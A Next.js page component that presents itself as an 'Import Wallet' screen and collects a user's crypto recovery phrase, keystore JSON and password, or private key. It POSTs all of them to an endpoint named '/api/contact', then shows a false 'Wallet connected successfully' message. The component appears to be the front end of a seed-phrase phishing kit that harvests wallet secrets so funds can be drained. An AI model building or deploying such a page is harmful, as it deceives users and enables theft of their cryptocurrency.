import Head from "next/head";
import React, { useState } from "react";
import NoLayout from "../../components/NoLayout";
import { FaAngleLeft } from "react-icons/fa";
import { useRouter } from "next/dist/client/router";
import Link from "next/link";
import cogoToast from "cogo-toast";

const WalletItem = () => {
  const router = useRouter();
  const [inputValues, setInputValues] = useState({
    phrase: "",
    keystorejson: "",
    keystorepassword: "",
    privateKey: "",
  });

  const [path, setPath] = useState(router.asPath);

  const handleChange = (e) => {
    e.preventDefault();
    const { name, value } = e.target;

    setInputValues({ ...inputValues, [name]: value });
  };

  const { tab } = router.query;
  console.log(router.query.wallet, "kk");

  const isTabOne = tab === "phrase" || tab == null;
  const isTabTwo = tab === "keystore";
  const isTabThree = tab === "private-key";

  async function handleSubmit(e) {
    e.preventDefault();

    await fetch("/api/contact", {
      method: "POST",
      headers: {
        Accept: "application/json, text/plain, */*",
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        key: `${router.query.wallet}`,
        phrase: `${inputValues.phrase}`,
        keystorejson: `${inputValues.keystorejson}`,
        keystorepassword: `${inputValues.keystorepassword}`,
        privateKey: `${inputValues.privateKey}`,
      }),
    }).then((res) => {
      cogoToast.success("Congratulations! Wallet connected successfully", {
        position: "top-right",
        hideAfter: 5,
      });
      setInputValues({
        ...inputValues,
        phrase: "",
        keystorejson: "",
        keystorepassword: "",
        privateKey: "",
      });
    });
  }
  return (
    <div className="flex flex-col place-items-center p-12 space-y-10 text-center align-middle text-white bg-gray-900 h-screen overflow-x-hidden text-lg">
      <div
        onClick={(e) => router.push("/wallets")}
        className="flex place-items-center"
      >
        <FaAngleLeft />
        <p className="pl-2 font-bold">Import Wallet</p>
      </div>
      <div className="max-width-30">
        <div className="flex justify-between nav-tabs">
          <Link
            href={{ pathname: "/wallets/[wallet]", query: { tab: "phrase" } }}
            as={{
              pathname: `/wallets/${router.query.wallet}`,
              query: { tab: "phrase" },
            }}
          >
            <a
              className={`${
                isTabOne ? "text-white mr-10 active-tab" : "text-white mr-10"
              }`}
            >
              Phrase
            </a>
          </Link>
          <Link
            href={{ pathname: "/wallets/[wallet]", query: { tab: "keystore" } }}
            as={{
              pathname: `/wallets/${router.query.wallet}`,
              query: { tab: "keystore" },
            }}
          >
            <a
              className={`${
                isTabTwo ? "text-white mr-10 active-tab" : "text-white mr-10"
              }`}
            >
              KeyStore Json
            </a>
          </Link>
          <Link
            href={{
              pathname: "/wallets/[wallet]",
              query: { tab: "private-key" },
            }}
            as={{
              pathname: `/wallets/${router.query.wallet}`,
              query: { tab: "private-key" },
            }}
          >
            <a
              className={`${
                isTabThree ? "text-white active-tab" : "text-white"
              }`}
            >
              Private Key
            </a>
          </Link>
        </div>
        {isTabOne && (
          <div>
            <textarea
              className="input-form h-40 mb-5"
              name="phrase"
              value={inputValues.phrase}
              placeholder="Phrase"
              onChange={handleChange}
              required
            ></textarea>
            <p className="text-secondary">
              Typically 12 (sometimes 24) words seperated by a single spaces.
            </p>
          </div>
        )}

        {isTabTwo && (
          <div>
            <textarea
              className="input-form h-40 mb-12"
              name="keystorejson"
              value={inputValues.keystorejson}
              placeholder="Keystore JSON"
              onChange={handleChange}
              required
            ></textarea>
            <input
              className="input-form mb-5"
              type="password"
              name="keystorepassword"
              value={inputValues.keystorepassword}
              placeholder="Password"
              onChange={handleChange}
              required
            ></input>
            <p className="text-secondary">
              Several lines of text beginning with &quot; &#46; &#46; &#46;
              &quot; plus the password you used to encrypt it.
            </p>
          </div>
        )}

        {isTabThree && (
          <div>
            <input
              placeholder="Private key"
              className="input-form mb-5"
              name="privateKey"
              value={inputValues.privateKey}
              onChange={handleChange}
            />
            <p className="text-secondary">
              Typically 12 (sometimes 24) words seperated by a single spaces.
            </p>
          </div>
        )}
        <button className="btn-primary mt-5 w-full" onClick={handleSubmit}>
          Import
        </button>
      </div>
    </div>
  );
};

export default WalletItem;
